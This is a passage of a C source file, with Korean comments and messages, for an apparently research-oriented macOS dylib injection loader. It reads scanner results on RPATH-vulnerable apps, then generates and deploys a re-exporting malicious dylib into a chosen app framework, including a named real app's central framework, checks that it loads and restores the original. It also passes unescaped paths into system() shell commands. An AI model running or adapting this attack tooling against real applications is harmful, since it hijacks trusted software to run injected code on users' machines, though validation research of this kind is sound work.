        printf("  [✗] 복구 실패 (권한 부족)\n");
    }

    /* 정리 */
    free(dylib_name);
    free(tmp_backup_path);

    printf("\n[✓] Type A 처리 완료 (%s)\n", verification_success ? "성공" : "실패");

    return verification_success;
}

/**
 * Type B 처리: Framework 분석
 */
static bool handle_type_b(VulnerableTarget *target) {
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    printf("║           Type B: 서드파티 Framework                     ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n");
    
    printf("\n[*] Type B 특성\n");
    printf("    - 서드파티 Framework\n");
    printf("    - 검증 시간: ~5분/앱\n");
    
    printf("\n[*] 취약 Framework 목록:\n");
    size_t unique_fw_count = 0;
    char **fw_names = extract_framework_names(
        target->rpath_vulns,
        target->rpath_count,
        &unique_fw_count
    );
    
    for (size_t i = 0; i < unique_fw_count; i++) {
        printf("    [%zu] %s\n", i + 1, fw_names[i]);
    }
    
    // Framework 분석
    printf("\n[*] Framework 분석 시작...\n");
    
    for (size_t i = 0; i < unique_fw_count; i++) {
        printf("\n    [%zu] %s 분석\n", i + 1, fw_names[i]);
        
        // framework_analyzer 사용
        FrameworkInfo *fw_info = analyze_framework(fw_names[i]);
        if (fw_info) {
            printf("        dylib 개수: %zu\n", fw_info->dylib_count);
            printf("        의존성 개수: %zu\n", fw_info->dep_count);
            
            // Framework 정보 출력
            printf("        [Dylibs]\n");
            for (size_t j = 0; j < fw_info->dylib_count && j < 3; j++) {
                printf("          - %s\n", fw_info->dylibs[j]);
            }
            if (fw_info->dylib_count > 3) {
                printf("          ... 외 %zu개\n", fw_info->dylib_count - 3);
            }
            
            printf("        [의존성]\n");
            for (size_t j = 0; j < fw_info->dep_count && j < 3; j++) {
                printf("          - %s\n", fw_info->dependencies[j]);
            }
            if (fw_info->dep_count > 3) {
                printf("          ... 외 %zu개\n", fw_info->dep_count - 3);
            }
            
            free_framework_info(fw_info);
        }
    }
    
    printf("\n[*] Type 분석\n");
    
    // 다중 Type 분석 추가
    size_t pure_dylib_count = target->rpath_count - count_frameworks_in_paths(target->rpath_vulns, target->rpath_count);
    if (pure_dylib_count > 0) {
        printf("\n[⚠] 추가 Type A 요소:\n");
        printf("    %zu개의 독립형 dylib도 존재\n", pure_dylib_count);
        printf("    → Type B (Framework) 공격이 더 광범위하지만,\n");
        printf("       Type A (독립 dylib) 방식 공격도 병행 가능\n");
    }

    // ✨ Type B 실제 앱 Framework 공격
    printf("\n[?] Framework 공격을 수행하시겠습니까? (y/n): ");
    fflush(stdout);

    char verify_input[10];
    if (!fgets(verify_input, sizeof(verify_input), stdin)) {
        printf("[*] 공격 건너뜀\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        printf("\n[✓] Type B 처리 완료 (공격 미실행)\n");
        return true;
    }

    if (verify_input[0] != 'y' && verify_input[0] != 'Y') {
        printf("[*] 공격 건너뜀\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        printf("\n[✓] Type B 처리 완료 (공격 미실행)\n");
        return true;
    }

    // Framework 선택
    printf("\n[*] 공격 대상 Framework 선택:\n");
    for (size_t i = 0; i < unique_fw_count; i++) {
        printf("    [%zu] %s\n", i + 1, fw_names[i]);
    }
    printf("    [0] 취소\n");
    printf("[?] 선택 (1-%zu, 0 취소): ", unique_fw_count);
    fflush(stdout);

    char choice_input[10];
    if (!fgets(choice_input, sizeof(choice_input), stdin)) {
        printf("[*] 공격 취소\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        return false;
    }

    int selected_fw = atoi(choice_input);
    if (selected_fw < 1 || selected_fw > (int)unique_fw_count) {
        printf("[*] 유효하지 않은 선택\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        return false;
    }

    char *selected_framework = fw_names[selected_fw - 1];
    printf("\n[✓] 선택됨: %s\n", selected_framework);

    // 공격 컨텍스트 생성
    SupplyChainAttackContext *attack_ctx = malloc(sizeof(SupplyChainAttackContext));
    if (!attack_ctx) {
        fprintf(stderr, "[ERROR] 메모리 할당 실패\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        return false;
    }

    memset(attack_ctx, 0, sizeof(SupplyChainAttackContext));

    // Framework 정보 설정
    char *app_bundle = extract_app_bundle_path(target->binary_path);
    if (app_bundle) {
        attack_ctx->target_app_path = malloc(strlen(app_bundle) + 1);
        strcpy(attack_ctx->target_app_path, app_bundle);
        free(app_bundle);
    }

    attack_ctx->target_framework_path = malloc(strlen(selected_framework) + 1);
    strcpy(attack_ctx->target_framework_path, selected_framework);

    // Framework 분석
    attack_ctx->framework = sc_analyze_framework(
        attack_ctx->target_app_path,
        attack_ctx->target_framework_path
    );

    if (!attack_ctx->framework) {
        fprintf(stderr, "[ERROR] Framework 분석 실패\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        sc_free_supply_chain_context(attack_ctx);
        return false;
    }

    // ✨ 악성 dylib 생성
    printf("\n[*] 악성 dylib 생성 (Re-export)...\n");
    if (!sc_generate_malicious_dylib_with_reexport(attack_ctx)) {
        fprintf(stderr, "[ERROR] 악성 dylib 생성 실패\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        sc_free_supply_chain_context(attack_ctx);
        return false;
    }

    // ✨ 공격 배포
    printf("\n[*] Framework 공격 배포...\n");
    if (!sc_deploy_supply_chain_attack(attack_ctx)) {
        fprintf(stderr, "[ERROR] 배포 실패\n");
        for (size_t i = 0; i < unique_fw_count; i++) {
            free(fw_names[i]);
        }
        free(fw_names);
        sc_free_supply_chain_context(attack_ctx);
        return false;
    }

    // ✨ 검증
    printf("\n[*] Framework 공격 검증...\n");
    bool verification_result = sc_verify_supply_chain_attack(
        attack_ctx,
        target->binary_path,
        "Re-export 악성"
    );

    if (verification_result) {
        printf("\n[✓✓✓] Type B Framework 공격 성공!\n");
        printf("\n[*] 검증된 내용:\n");
        printf("    ✓ Framework 주입 공격 성공\n");
        printf("    ✓ Re-export 악성 dylib 로드됨\n");
        printf("    ✓ 정상 기능 유지 확인\n");
        printf("    ✓ 침해 가능성 확인\n");
    } else {
        printf("\n[✗✗✗] Type B 검증 실패\n");
    }

    // 복구
    printf("\n[*] 원본 Framework 복구...\n");
    sc_restore_original_framework(attack_ctx);

    // 정리
    for (size_t i = 0; i < unique_fw_count; i++) {
        free(fw_names[i]);
    }
    free(fw_names);
    sc_free_supply_chain_context(attack_ctx);

    printf("\n[✓] Type B 처리 완료 (%s)\n", verification_result ? "성공" : "실패");
    return verification_result;
}

/**
 * Type C 처리: 모듈화 Framework 체인 분석
 */
static bool handle_type_c(VulnerableTarget *target) {
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    printf("║         Type C: 내부 모듈화 Framework 체인                ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n");
    
    printf("\n[*] Type C 특성\n");
    printf("    - 내부 모듈화 프레임워크들\n");
    printf("    - 복잡한 RPATH 체인 (7~10단계)\n");
    printf("    - 다중 진입점 (main, XPC, Widget)\n");
    printf("    - 검증 시간: ~10분/앱\n");
    
    // Framework 분석
    char *app_bundle = extract_app_bundle_path(target->binary_path);
    if (app_bundle) {
        printf("\n[*] 앱 번들 분석: %s\n", app_bundle);
        
        size_t fw_count = 0;
        FrameworkInfo **fw_infos = analyze_frameworks_in_app(app_bundle, &fw_count);
        
        if (fw_infos && fw_count > 0) {
            printf("    발견된 Framework: %zu개\n", fw_count);
            
            // 처음 5개만 표시
            for (size_t i = 0; i < fw_count && i < 5; i++) {
                printf("    [%zu] %s\n", i + 1, fw_infos[i]->name);
                printf("         - dylib: %zu개\n", fw_infos[i]->dylib_count);
                printf("         - 의존성: %zu개\n", fw_infos[i]->dep_count);
            }
            
            if (fw_count > 5) {
                printf("    ... 외 %zu개\n", fw_count - 5);
            }
            
            free_all_framework_infos(fw_infos, fw_count);
        }
        
        free(app_bundle);
    }
    
    // RPATH 체인 분석
    printf("\n[*] RPATH 체인 분석\n");
    printf("    RPATH 경로 수: %zu개\n", target->rpath_count);
    
    printf("    [경로 목록]\n");
    for (size_t i = 0; i < target->rpath_count && i < 10; i++) {
        printf("    [%zu] %s\n", i + 1, target->rpath_vulns[i]);
    }
    if (target->rpath_count > 10) {
        printf("    ... 외 %zu개\n", target->rpath_count - 10);
    }
    
    // RPATH 우선도 분석 (샘플: 첫 번째 경로)
    if (target->rpath_count > 0) {
        printf("\n[*] RPATH 우선도 분석 (첫 번째 경로 기준)\n");
        
        // dylib 이름 추출
        char dylib_name[256];
        const char *last_slash = strrchr(target->rpath_vulns[0], '/');
        if (last_slash) {
            strncpy(dylib_name, last_slash + 1, sizeof(dylib_name) - 1);
            dylib_name[sizeof(dylib_name) - 1] = '\0';
        }
        
        printf("    분석 대상 dylib: %s\n", dylib_name);
        printf("    RPATH 체인 깊이: %zu (분석 예정)\n", target->rpath_count);
        
        // multi_rpath_resolver 사용 예시
        printf("    [우선도 레벨]\n");
        printf("    - 레벨 0 (최고 우선도): 파일 존재 시 로드\n");
        printf("    - 레벨 1-N: 이전 레벨 미스 시 탐색\n");
    }
    
    printf("\n[*] Type C 취약점 평가\n");
    printf("    복잡도 수준: 높음\n");
    printf("    의존성 깊이: %zu단계\n", target->rpath_count);
    printf("    공격 표면: 다중 진입점 + 깊은 체인\n");
    printf("    위험도: 높음 (모든 진입점에 영향)\n");
    
    // 다중 Type 분석
    size_t fw_count_c = count_frameworks_in_paths(target->rpath_vulns, target->rpath_count);
    size_t pure_dylib_count_c = target->rpath_count - fw_count_c;
    
    if (fw_count_c > 0 && fw_count_c <= 3) {
        printf("\n[⚠] 포함된 Type B 요소:\n");
        printf("    %zu개의 Framework\n", fw_count_c);
    }
    
    if (pure_dylib_count_c > 0) {
        printf("\n[⚠] 포함된 Type A 요소:\n");
        printf("    %zu개의 독립형 dylib\n", pure_dylib_count_c);
        printf("    → 직접 dylib 공격도 가능\n");
    }

    // ✨ Type C: 내부 모듈화 Framework 체인 공격 검증
    printf("\n[?] Framework 의존성 체인 공격 검증을 수행하시겠습니까? (y/n): ");
    fflush(stdout);

    char verify_input_c[10];
    if (!fgets(verify_input_c, sizeof(verify_input_c), stdin)) {
        printf("[ERROR] 입력 실패\n");
        return false;
    }

    if (tolower(verify_input_c[0]) != 'y') {
        printf("[*] Type C 검증 건너뛰기\n");
        return true;
    }

    // ============================================================
    // Type C: 내부 모듈화 Framework 체인 공격
    // ============================================================
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    printf("║    Type C 검증: Framework 의존성 체인 공격                ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n");

    printf("\n[*] Type C 공격 원리\n");
    printf("    - 중심 Framework (모두가 의존) 찾기\n");
    printf("    - 해당 Framework를 re-export로 교체\n");
    printf("    - 모든 의존 Framework가 악성 dylib 로드\n");
    printf("    - 다중 진입점 모두 침해 가능\n");

    char *app_bundle_c = extract_app_bundle_path(target->binary_path);
    if (!app_bundle_c) {
        fprintf(stderr, "[ERROR] 앱 번들 경로 추출 실패\n");
        return false;
    }

    printf("\n[*] Framework 의존성 분석\n");
    printf("    앱 번들: %s\n", app_bundle_c);

    // Stats.app의 경우: Kit.framework가 중심 (모두가 의존)
    // 일반적으로 이름에 "Kit" 또는 가장 많이 의존되는 Framework 찾기
    size_t fw_count_analyze = 0;
    FrameworkInfo **fw_infos_analyze = analyze_frameworks_in_app(app_bundle_c, &fw_count_analyze);

    const char *target_framework_c = NULL;
    if (fw_infos_analyze && fw_count_analyze > 0) {
        printf("    발견된 Framework: %zu개\n", fw_count_analyze);

        // Kit.framework 찾기 (Stats의 중심 Framework)
        for (size_t i = 0; i < fw_count_analyze; i++) {
            if (strstr(fw_infos_analyze[i]->name, "Kit")) {
                target_framework_c = fw_infos_analyze[i]->path;
                printf("    [✓] 중심 Framework 발견: %s\n", fw_infos_analyze[i]->name);
                printf("         의존성: %zu개 Framework가 이를 사용\n", fw_infos_analyze[i]->dep_count);
                break;
            }
        }

        // Kit이 없으면 의존성이 가장 많은 Framework 찾기
        if (!target_framework_c && fw_count_analyze > 0) {
            size_t max_deps = 0;
            for (size_t i = 0; i < fw_count_analyze; i++) {
                if (fw_infos_analyze[i]->dep_count > max_deps) {
                    max_deps = fw_infos_analyze[i]->dep_count;
                    target_framework_c = fw_infos_analyze[i]->path;
                }
            }
            if (target_framework_c) {
                printf("    [✓] 중심 Framework: %s (의존성: %zu)\n",
                       strrchr(target_framework_c, '/') ? strrchr(target_framework_c, '/') + 1 : target_framework_c,
                       max_deps);
            }
        }
    }

    if (!target_framework_c) {
        fprintf(stderr, "[ERROR] 중심 Framework를 찾을 수 없습니다\n");
        free(app_bundle_c);
        if (fw_infos_analyze) free_all_framework_infos(fw_infos_analyze, fw_count_analyze);
        return false;
    }

    // Type C: SupplyChainAttackContext 생성
    printf("\n[*] Type C 공격 준비\n");
    SupplyChainAttackContext *ctx_c = malloc(sizeof(SupplyChainAttackContext));
    if (!ctx_c) {
        fprintf(stderr, "[ERROR] 컨텍스트 할당 실패\n");
        free(app_bundle_c);
        if (fw_infos_analyze) free_all_framework_infos(fw_infos_analyze, fw_count_analyze);
        return false;
    }

    ctx_c->target_app_path = malloc(strlen(target->binary_path) + 1);
    strcpy(ctx_c->target_app_path, target->binary_path);
    ctx_c->target_framework_path = malloc(strlen(target_framework_c) + 1);
    strcpy(ctx_c->target_framework_path, target_framework_c);

    ctx_c->framework = sc_analyze_framework(target->binary_path, target_framework_c);
    ctx_c->backup_dylib_path = NULL;
    ctx_c->malicious_dylib_path = NULL;
    ctx_c->attack_log_path = NULL;
    ctx_c->is_reexport_enabled = false;
    ctx_c->is_deployed = false;

    // Re-export dylib 생성
    printf("  [Step 1] Re-export dylib 생성\n");
    if (!sc_generate_malicious_dylib_with_reexport(ctx_c)) {
        fprintf(stderr, "    [ERROR] Re-export dylib 생성 실패\n");
        sc_free_supply_chain_context(ctx_c);
        free(app_bundle_c);
        if (fw_infos_analyze) free_all_framework_infos(fw_infos_analyze, fw_count_analyze);
        return false;
    }

    // 악성 dylib 배포
    printf("  [Step 2] 악성 dylib 배포\n");
    if (!sc_deploy_supply_chain_attack(ctx_c)) {
        fprintf(stderr, "    [ERROR] 배포 실패 (권한 없음)\n");
        sc_free_supply_chain_context(ctx_c);
        free(app_bundle_c);
        if (fw_infos_analyze) free_all_framework_infos(fw_infos_analyze, fw_count_analyze);
        return false;
    }

    // 공격 검증
    printf("  [Step 3] 의존성 체인 검증\n");
    bool type_c_success = sc_verify_supply_chain_attack(
        ctx_c,
        target->binary_path,
        "Supply Chain Attack Success"
    );

    // 원본 복구
    printf("  [Step 4] 원본 Framework 복구\n");
    sc_restore_original_framework(ctx_c);

    // 결과 보고
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    if (type_c_success) {
        printf("║        ✓ Type C 검증 성공                               ║\n");
    } else {
        printf("║        ✗ Type C 검증 실패                               ║\n");
    }
    printf("╚════════════════════════════════════════════════════════════╝\n");

    if (type_c_success) {
        printf("\n[✓] Type C 내부 모듈화 프레임워크 공격 성공!\n");
        printf("    공격 대상: %s Framework (중심 의존성)\n", ctx_c->framework->name);
        printf("    공격 기법: Re-export dylib 주입\n");
        printf("    영향 범위: 모든 의존 Framework + 다중 진입점\n");
        printf("    \n    로그 파일: %s\n", ctx_c->attack_log_path);
    } else {
        printf("\n[✗] 공격 검증 실패\n");
        printf("    가능한 원인:\n");
        printf("    - 코드 서명 강도\n");
        printf("    - dyld 동적 로딩 제약\n");
        printf("    - Framework 의존성 구조 차이\n");
    }

    // 정리
    sc_free_supply_chain_context(ctx_c);
    free(app_bundle_c);
    if (fw_infos_analyze) free_all_framework_infos(fw_infos_analyze, fw_count_analyze);

    return type_c_success;
}

/* ================================================================
 * 핵심: handle_target 개선 - Type 선택 메뉴 추가
 * ================================================================ */

static bool handle_target(VulnerableTarget *target) {
    if (!target) return false;
    
    printf("\n════════════════════════════════════════════════════════════════════\n");
    printf("                    취약한 바이너리 처리\n");
    printf("════════════════════════════════════════════════════════════════════\n");
    printf("경로: %s\n\n", target->binary_path);
    
    // Step 1: Type 자동 판정
    size_t fw_count = count_frameworks_in_paths(target->rpath_vulns, target->rpath_count);
    printf("[*] Type 자동 판정:\n");
    printf("    RPATH 경로: %zu개\n", target->rpath_count);
    printf("    Framework: %zu개\n", fw_count);
    
    // Step 2: 다중 Type 분석
    MultiTypeInfo multi_type = analyze_multi_types(target, fw_count);
    
    printf("\n[*] 감지된 Type:\n");
    if (multi_type.has_type_a) {
        printf("    [A] Type A: %zu개 독립형 dylib ✓\n", multi_type.type_a_count);
    }
    if (multi_type.has_type_b) {
        printf("    [B] Type B: %zu개 Framework 번들 ✓\n", multi_type.type_b_count);
    }
    if (multi_type.has_type_c) {
        printf("    [C] Type C: 깊이 %zu 모듈화 체인 ✓\n", multi_type.type_c_depth);
    }
    
    // Step 3: 사용자가 검증할 Type 선택
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    printf("║          어떤 타입의 취약점을 검증할까요?          ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n\n");
    
    int type_choice = 0;
    
    if (multi_type.has_type_a && multi_type.has_type_b && multi_type.has_type_c) {
        // 세 가지 모두 감지된 경우
        printf("검증 옵션:\n");
        printf("  [1] Type A - RPATH dylib 주입 검증\n");
        printf("  [2] Type B - Framework 주입 검증\n");
        printf("  [3] Type C - Framework 체인 주입 검증\n");
        printf("  [0] 취소\n");
        type_choice = get_user_choice("선택", 0, 3);
    } else if (multi_type.has_type_a && multi_type.has_type_b) {
        // A, B만 감지
        printf("검증 옵션:\n");
        printf("  [1] Type A - RPATH dylib 주입 검증\n");
        printf("  [2] Type B - Framework 주입 검증\n");
        printf("  [0] 취소\n");
        type_choice = get_user_choice("선택", 0, 2);
    } else if (multi_type.has_type_a && multi_type.has_type_c) {
        // A, C만 감지
        printf("검증 옵션:\n");
        printf("  [1] Type A - RPATH dylib 주입 검증\n");
        printf("  [3] Type C - Framework 체인 주입 검증\n");
        printf("  [0] 취소\n");
        printf("선택 (0, 1, 3): ");
        fflush(stdout);
        char input[256];
        if (fgets(input, sizeof(input), stdin)) {
            type_choice = atoi(input);
            if (type_choice != 0 && type_choice != 1 && type_choice != 3) {
                type_choice = 0;
            }
        }
    } else if (multi_type.has_type_b && multi_type.has_type_c) {
        // B, C만 감지
        printf("검증 옵션:\n");
        printf("  [2] Type B - Framework 주입 검증\n");
        printf("  [3] Type C - Framework 체인 주입 검증\n");
        printf("  [0] 취소\n");
        printf("선택 (0, 2, 3): ");
        fflush(stdout);
        char input[256];
        if (fgets(input, sizeof(input), stdin)) {
            type_choice = atoi(input);
            if (type_choice != 0 && type_choice != 2 && type_choice != 3) {
                type_choice = 0;
            }
        }
    } else if (multi_type.has_type_a) {
        // Type A만
        printf("검증 옵션:\n");
        printf("  [1] Type A - RPATH dylib 주입 검증\n");
        printf("  [0] 취소\n");
        type_choice = get_user_choice("선택", 0, 1);
    } else if (multi_type.has_type_b) {
        // Type B만
        printf("검증 옵션:\n");
        printf("  [2] Type B - Framework 주입 검증\n");
        printf("  [0] 취소\n");
        printf("선택 (0 또는 2): ");
        fflush(stdout);
        char input[256];
        if (fgets(input, sizeof(input), stdin)) {
            int choice = atoi(input);
            type_choice = (choice == 2) ? 2 : 0;
        }
    } else if (multi_type.has_type_c) {
        // Type C만
        printf("검증 옵션:\n");
        printf("  [3] Type C - Framework 체인 주입 검증\n");
        printf("  [0] 취소\n");
        printf("선택 (0 또는 3): ");
        fflush(stdout);
        char input[256];
        if (fgets(input, sizeof(input), stdin)) {
            int choice = atoi(input);
            type_choice = (choice == 3) ? 3 : 0;
        }
    }
    
    if (type_choice == 0) {
        printf("\n[*] 사용자 취소\n");
        return false;
    }
    
    // Step 4: 선택한 Type의 검증 함수 호출
    bool success = false;
    
    switch (type_choice) {
        case 1:
            success = handle_type_a(target);
            break;
        case 2:
            success = handle_type_b(target);
            break;
        case 3:
            success = handle_type_c(target);
            break;
        default:
            return false;
    }
    return success;
}

/* ================================================================
 * 메인 프로그램 (기존 구조 유지)
 * ================================================================ */

/* ================================================================
 * Type B/C 검증 Helper 함수들
 * ================================================================ */

/**
 * build_test_apps.sh 실행하여 테스트 앱 빌드
 */
static bool build_test_apps_for_validation(char *out_app_path, size_t out_len) {
    printf("\n[*] 테스트 앱 빌드\n");
    printf("   build_test_apps.sh 실행 중...\n");

    // build_test_apps.sh 실행 (loader/src/validation_code/ 기준)
    int ret = system("bash ./loader/src/validation_code/build_test_apps.sh 2>&1 | tail -20");

    if (ret != 0) {
        fprintf(stderr, "[ERROR] 테스트 앱 빌드 실패\n");
        return false;
    }

    // 빌드된 앱 경로
    const char *app_dir = "/tmp/example_apps_build";
    snprintf(out_app_path, out_len, "%s", app_dir);

    printf("[✓] 빌드 완료: %s\n", out_app_path);
    return true;
}

/**
 * Type B: SimplePayload.framework 악성화
 */
static bool create_malicious_type_b(const char *app_path) {
    printf("\n[*] Type B 악성 Framework 생성\n");
    printf("   create_malicious_payload_type_b.sh 실행 중...\n");

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "bash ./loader/src/validation_code/create_malicious_payload_type_b.sh '%s/TestApp.app' 2>&1 | tail -15",
             app_path);

    int ret = system(cmd);

    if (ret != 0) {
        fprintf(stderr, "[ERROR] Type B 악성 Framework 생성 실패\n");
        return false;
    }

    printf("[✓] 악성 Framework 생성 완료\n");
    return true;
}

/**
 * 테스트 앱 실행 및 로그 수집
 */
static bool run_app_and_collect_logs(const char *app_path, const char *app_name, char *out_log, size_t out_len) {
    printf("\n[*] 테스트 앱 실행\n");
    printf("   %s 실행 중...\n", app_name);

    char cmd[1024];
    char temp_log[256];
    snprintf(temp_log, sizeof(temp_log), "/tmp/%s_output.txt", app_name);

    snprintf(cmd, sizeof(cmd),
             "'%s/Contents/MacOS/%s' > '%s' 2>&1 || true",
             app_path, app_name, temp_log);

    printf("   [실행] %s\n", cmd);
    system(cmd);

    // 로그 파일 읽기
    FILE *fp = fopen(temp_log, "r");
    if (!fp) {
        fprintf(stderr, "[ERROR] 로그 파일 열 수 없음\n");
        return false;
    }

    size_t total_read = 0;
    int ch;
    while ((ch = fgetc(fp)) != EOF && total_read < out_len - 1) {
        out_log[total_read++] = ch;
    }
    out_log[total_read] = '\0';
    fclose(fp);

    printf("[✓] 앱 실행 완료, 로그 수집됨 (%zu bytes)\n", total_read);

    // 임시 파일 삭제
    unlink(temp_log);

    return total_read > 0;
}

/**
 * 로그 분석: "악성 Framework 실행" 메시지 확인
 */
static bool verify_malicious_framework_loaded(const char *log, const char *expected_keyword) {
    printf("\n[*] 로그 분석\n");

    if (!log || !expected_keyword) {
        fprintf(stderr, "[ERROR] 로그 또는 검색 키워드 없음\n");
        return false;
    }

    // 로그에서 악성 Framework 실행 메시지 확인
    if (strstr(log, expected_keyword)) {
        printf("[✓] 악성 Framework 로드 확인!\n");
        printf("   검색 키워드: '%s'\n", expected_keyword);
        return true;
    } else {
        printf("[✗] 악성 Framework 로드 실패\n");
        printf("   기대했던 메시지: '%s'\n", expected_keyword);
        printf("\n[*] 실제 로그 출력 (처음 50줄):\n");
        printf("════════════════════════════════════════════════════════════\n");

        // 첫 50줄만 출력
        const char *p = log;
        int line_count = 0;
        while (*p && line_count < 50) {
            printf("%c", *p);
            if (*p == '\n') line_count++;
            p++;
        }
        printf("════════════════════════════════════════════════════════════\n");

        return false;
    }
}

/**
 * Framework 복구 (악성 버전 제거)
 */
static bool restore_original_framework(const char *app_path, const char *framework_name) {
    printf("\n[*] 원본 Framework 복구\n");

    char backup_path[1024];
    char original_path[1024];

    snprintf(backup_path, sizeof(backup_path),
             "%s/TestApp.app/Contents/Frameworks/%s.framework/Versions/A.backup/%s.backup",
             app_path, framework_name, framework_name);

    snprintf(original_path, sizeof(original_path),
             "%s/TestApp.app/Contents/Frameworks/%s.framework/Versions/A/%s",
             app_path, framework_name, framework_name);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "cp -f '%s' '%s' 2>&1 && echo '[복구 성공]' || echo '[복구 실패]'",
             backup_path, original_path);

    printf("   명령: %s\n", cmd);
    int ret = system(cmd);

    if (ret == 0) {
        printf("[✓] Framework 복구 완료\n");
        return true;
    } else {
        printf("[WARNING] Framework 복구 불완전 (계속 진행)\n");
        return false;
    }
}


int main(int argc, char **argv) {
    printf("════════════════════════════════════════════════════════════════════\n");
    printf("              macOS Dylib 주입 로더 (Type A/B/C 검증)\n");
    printf("        바이너리 선택 → Type 분석 → Type별 검증 선택 → 검증\n");
    printf("════════════════════════════════════════════════════════════════════\n\n");
    
    char *scanner_output = SCANNER_OUTPUT_PATH;
    if (argc > 1) {
        scanner_output = argv[1];
    }
    
    printf("[*] 설정\n");
    printf("   - Scanner 결과: %s\n\n", scanner_output);
    
    // 1. Report 파싱
    printf("[*] Scanner 결과 파싱 중...\n");
    ParsedResults *results = parse_scanner_output(scanner_output);
    
    if (!results || results->target_count == 0) {
        printf("[✗] 취약한 바이너리가 없거나 파싱 실패\n");
        return 1;
    }
    
    print_parsed_results(results);
    
    // 2. 사용자가 처리할 바이너리 선택
    printf("\n[*] 처리할 바이너리 선택\n");
    for (size_t i = 0; i < results->target_count; i++) {
        printf("   [%zu] %s\n", i + 1, results->targets[i]->binary_path);
    }
    printf("   [0] 모두 처리\n\n");
    
    int target_choice = get_user_choice("선택", 0, (int)results->target_count);
    
    // 3. 선택된 바이너리에 대해 handle_target 호출
    int processed_count = 0;
    int success_count = 0;
    
    if (target_choice == 0) {
        // 모두 처리
        printf("\n[*] 모든 바이너리 처리 시작...\n");
        for (size_t i = 0; i < results->target_count; i++) {
            processed_count++;
            if (handle_target(results->targets[i])) {
                success_count++;
            }
            
            if (i < results->target_count - 1) {
                printf("\n[*] 엔터를 눌러 다음을 계속...");
                getchar();
            }
        }
    } else {
        // 선택된 것만 처리
        printf("\n[*] 선택된 바이너리 처리...\n");
        processed_count = 1;
        if (handle_target(results->targets[target_choice - 1])) {
            success_count++;
        }
    }
    
    // 4. 완료 보고
    printf("\n════════════════════════════════════════════════════════════════════\n");
    printf("                          처리 완료\n");
    printf("════════════════════════════════════════════════════════════════════\n");
    printf("총 바이너리: %zu개\n", results->target_count);
    printf("처리한 바이너리: %d개\n", processed_count);
    printf("성공: %d개\n", success_count);
    printf("실패: %d개\n", processed_count - success_count);
    
    free_parsed_results(results);
    return (success_count == processed_count && processed_count > 0) ? 0 : 1;
}